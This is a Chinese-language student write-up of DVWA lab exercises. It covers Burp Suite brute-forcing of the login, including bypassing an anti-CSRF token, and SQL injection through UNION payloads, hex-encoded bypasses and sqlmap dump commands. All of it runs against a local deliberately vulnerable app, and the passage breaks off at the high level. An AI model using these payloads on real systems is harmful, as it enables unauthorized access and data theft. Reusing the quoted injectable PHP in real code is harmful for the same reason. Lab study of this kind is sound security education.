    <title>网安作业2</title>
    <url>/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/</url>
    <content><![CDATA[<h1 id="DVWA实验"><a href="#DVWA实验" class="headerlink" title="DVWA实验"></a>DVWA实验</h1><p>一下都是基于low,mid,high级别的实验，为了方便叙述，提前在数据库中建了一个flag表</p>
<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>使用工具 ：bp</p>
<p>使用材料：密码字典</p>
<h3 id="bp的四种爆破攻击类型"><a href="#bp的四种爆破攻击类型" class="headerlink" title="bp的四种爆破攻击类型"></a>bp的四种爆破攻击类型</h3><h4 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h4><p>Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p>
<h4 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h4><p>Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</p>
<h4 id="第三种："><a href="#第三种：" class="headerlink" title="第三种："></a>第三种：</h4><p>Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p>
<h4 id="第四种："><a href="#第四种：" class="headerlink" title="第四种："></a>第四种：</h4><p>Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p>
<h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>1.抓包–&gt;ctrl+I –&gt;标记要爆破的参数，这里直接爆破password</p>
<p><img src="https://i.loli.net/2020/11/26/pEXImJf8eL1R7xq.png" alt="int1.png"></p>
<p>2.选择要加载的密码字典，可以使用自己准备的密码字典，也可以使用bp自带的密码字典，但是最重要的是要包含正确达到密码</p>
<p><img src="https://i.loli.net/2020/11/26/7hkFZm134qy8auw.png" alt="int3.png"></p>
<p><img src="https://i.loli.net/2020/11/26/SY9gXKPaRDoJ16k.png" alt="int2.png"></p>
<p>3.开始爆破 ，根据响应包的长度筛选出正确密码的响应包，这里只有当密码为password的时候响应包的长度为4743,所以password就是争取密码。</p>
<p><img src="https://i.loli.net/2020/11/26/GOsWwrvcobAxEpV.png" alt="int4.png"></p>
<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Sanitise username input</span>
    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];
    <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Sanitise password input</span>
    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];
    <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
    <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );

    <span class="hljs-comment">// Check the database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;
    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;
        <span class="hljs-comment">// Get users details</span>
        <span class="hljs-variable">$row</span>    = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> );
        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];

        <span class="hljs-comment">// Login successful</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;
    &#125;
    <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-comment">// Login failed</span>
        sleep( <span class="hljs-number">2</span> );
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;
    &#125;

    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>



<p>与low级别相比较，只是增加了回显的时间，所以还是可以使用low级别的方法直接爆破，不过花费的时间相对会长一点。</p>
<p>1.火狐浏览器打开代理抓包后发到爆破模块，添加爆破的变量。</p>
<p>2.加载密码字典进行爆破。</p>
<p>3.根据响应包的长度确定正确密码。</p>
<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Check Anti-CSRF token</span>
    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );

    <span class="hljs-comment">// Sanitise username input</span>
    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];
    <span class="hljs-variable">$user</span> = stripslashes( <span class="hljs-variable">$user</span> );
    <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Sanitise password input</span>
    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];
    <span class="hljs-variable">$pass</span> = stripslashes( <span class="hljs-variable">$pass</span> );
    <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
    <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );

    <span class="hljs-comment">// Check database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;
    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;
        <span class="hljs-comment">// Get users details</span>
        <span class="hljs-variable">$row</span>    = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> );
        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];

        <span class="hljs-comment">// Login successful</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;
    &#125;
    <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-comment">// Login failed</span>
        sleep( rand( <span class="hljs-number">0</span>, <span class="hljs-number">3</span> ) );
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;
    &#125;

    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);
&#125;

<span class="hljs-comment">// Generate Anti-CSRF token</span>
generateSessionToken();

<span class="hljs-meta">?&gt;</span>
</code></pre>

<p>审计代码后可以发现使用了随机token机制来防止CSRF，从而在一定程度上防止了重放攻击，增加了爆破难度，但是任然可以使用bp的爆破模块</p>
<p>1.抓包，发包到爆破模块并添加参数，这次需要添加两个参数，设置 password和user_token为变量</p>
<p><img src="https://i.loli.net/2020/11/05/WFYoqKklaEOwHtn.png" alt="intr3-1.png"></p>
<p>2.攻击类型选择pitchfork，意思是草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。</p>
<p><img src="https://i.loli.net/2020/11/05/tr4dB1SzEHxY9UD.png" alt="intr3-2.png"></p>
<p>3.设置参数，在option选项卡中将攻击线程thread设置为1，因为Recursive_Grep模式不支持多线程攻击，然后选择Grep-Extract，意思是用于提取响应消息中的有用信息，点击Add，如下图进行设置，最后将Redirections设置为Always</p>
<p><img src="https://i.loli.net/2020/11/05/d5qmsRVpu3kZ7Gr.png" alt="intr3-3.png"></p>
<p>4.设置payload，第一个参数是密码与之前两次一样，加载密码字典即可，第二token参数选择Recursive grep，然后将options中的token作为第一次请求的初始值。</p>
<p><img src="https://i.loli.net/2020/11/05/cQdZAUqgMDO4eJI.png" alt="intr3-4.png"></p>
<p>5.start attack,还是根据响应包长度的不同找到包含真正密码的请求包，获取正确密码。</p>
<p><img src="https://i.loli.net/2020/11/05/tpMjbBah95clPK8.png" alt="intr3-5.png"></p>
<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span> [ <span class="hljs-string">&#x27;id&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];

    <span class="hljs-comment">// Check database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;
    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );
    <span class="hljs-comment">// Get results</span>
    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;
        <span class="hljs-comment">// Get values</span>
        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];
        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];

        <span class="hljs-comment">// Feedback for end user</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;
    &#125;

    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);        
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;</code>注入点就在这句代码中</p>
<h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><h5 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1.判断注入类型"></a>1.判断注入类型</h5><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #

<span class="hljs-number">1</span><span class="hljs-comment">&#x27; or 1=1 #</span></code></pre>

<p>可知是字符型注入</p>
<h5 id="2-判断多少字段数"><a href="#2-判断多少字段数" class="headerlink" title="2.判断多少字段数"></a>2.判断多少字段数</h5><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">#</span></code></pre>

<p>报错</p>
<pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment">#</span></code></pre>

<p>显示正常，说明只有2个字段</p>
<h5 id="3-确认显示顺序"><a href="#3-确认显示顺序" class="headerlink" title="3.确认显示顺序"></a>3.确认显示顺序</h5><p><img src="https://i.loli.net/2020/11/06/isw8SKDdjWlv5AJ.png" alt="sqll-2.png"></p>
<p>两个位置都可以使用</p>
<h5 id="4-union查询"><a href="#4-union查询" class="headerlink" title="4.union查询"></a>4.union查询</h5><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()#</code></pre>

<p><img src="https://i.loli.net/2020/11/06/mudnW957ZotUhNM.png" alt="sqll-3.png"></p>
<pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-meta">#</span></code></pre>

<p><img src="https://i.loli.net/2020/11/06/UtxVjBMkiGb534Z.png" alt="sqll-4.png"></p>
<pre><code class="hljs capnproto"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-comment">#</span></code></pre>

<p><img src="https://i.loli.net/2020/11/06/BNp8ZiPgy2MdHvC.png" alt="sqll-1.png"></p>
<h4 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h4><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-params">--batch</span> <span class="hljs-params">--dbs</span>

python2 sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-params">--batch</span> -D dvwa -T flag <span class="hljs-params">--columns</span>

python2 sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-params">--batch</span> -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span></code></pre>

<p><img src="https://i.loli.net/2020/11/06/f87DeH6rKI2JhzY.png" alt="sqll-5.png"></p>
<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p>与low级别相比较，这里的id值不需要用户输入，只需要选择，但是可以抓包修改id的内容</p>
<p><img src="https://i.loli.net/2020/11/05/VTtp9QbyDe1Gsg8.png" alt="sqlm-1.png"></p>
<h4 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h4><p>经过测试是数字型注入，很简单的判断就不截图了</p>
<h5 id="1-判断列数"><a href="#1-判断列数" class="headerlink" title="1.判断列数"></a>1.判断列数</h5><pre><code class="hljs crmsh"><span class="hljs-attr">id=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-comment">#&amp;Submit=Submit</span></code></pre>

<p><img src="https://i.loli.net/2020/11/05/GuUbcedZETzJ7qw.png" alt="sqlm-2.png"></p>
<p>此时页面正常</p>
<pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> order by <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#&amp;Submit=Submit</code></pre>

<p>此时页面报错</p>
<p><code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code></p>
<p>所以可知为两列，之后的操作与low级别的一样</p>
<h5 id="2-union查询"><a href="#2-union查询" class="headerlink" title="2.union查询"></a>2.union查询</h5><pre><code class="hljs pgsql">爆数据库名
id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()#&amp;Submit=Submit
爆列名
id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-number">0x666c6167</span> #&amp;Submit=Submit

读取flag
id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(fl4g) <span class="hljs-keyword">from</span> flag #&amp;Submit=Submit
</code></pre>

<p>这里读取列名的时候需要注意使用列名的十六进制，不然就会报错，应该是 <code>&#39;</code>被 <code>\</code>转义了，可以使用十六进制绕过</p>
<p><img src="https://i.loli.net/2020/11/05/OlNHhc4Zy9KnsYS.png" alt="sqlm-3.png"></p>
<p><img src="https://i.loli.net/2020/11/05/zM1eE3plignbySf.png" alt="sqlm-4.png"></p>
<p><strong>分析源码</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];

    <span class="hljs-variable">$id</span> = mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$id</span>);

    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;
    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-comment">// Get results</span>
    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;
        <span class="hljs-comment">// Display values</span>
        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];
        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];

        <span class="hljs-comment">// Feedback for end user</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;
    &#125;

&#125;

<span class="hljs-comment">// This is used later on in the index.php page</span>
<span class="hljs-comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span>
<span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;
<span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
<span class="hljs-variable">$number_of_rows</span> = mysqli_fetch_row( <span class="hljs-variable">$result</span> )[<span class="hljs-number">0</span>];

mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]);
<span class="hljs-meta">?&gt;</span></code></pre>

<p><code>mysqli_real_escape_string()</code> 函数转义在 SQL 语句中使用的字符串中的特殊字符。</p>
<p>所以导致了单引号被转义的结果</p>
<h4 id="sqlmap注入-1"><a href="#sqlmap注入-1" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h4><p>因为是post注入，所以需要抓取数据包保存下来。</p>
<p>如图，可以将其保存在sqlmap.py的路径下</p>
<p><img src="https://i.loli.net/2020/11/06/hySBmFe4zoTgvNq.png" alt="sqlm-5.png"></p>
<h5 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h5><pre><code class="hljs stylus">python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch --dbs
python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa --tables
python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa -T flag --<span class="hljs-attribute">columns</span>
python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa -T flag -C fl4g --dump</code></pre>

<p><img src="https://i.loli.net/2020/11/06/zaHYUItEZlPFh4e.png" alt="sqlm-6.png"></p>
<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>这次用户输入与回显不在同一个页面，这只要是为了防止sqlmap这种自动化注入工具的攻击</p>
<p><img src="https://i.loli.net/2020/11/06/kAdfp8SFCroTlID.png" alt="sqlh-1.png"></p>
<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><p>直接使用low级别的payload：</p>
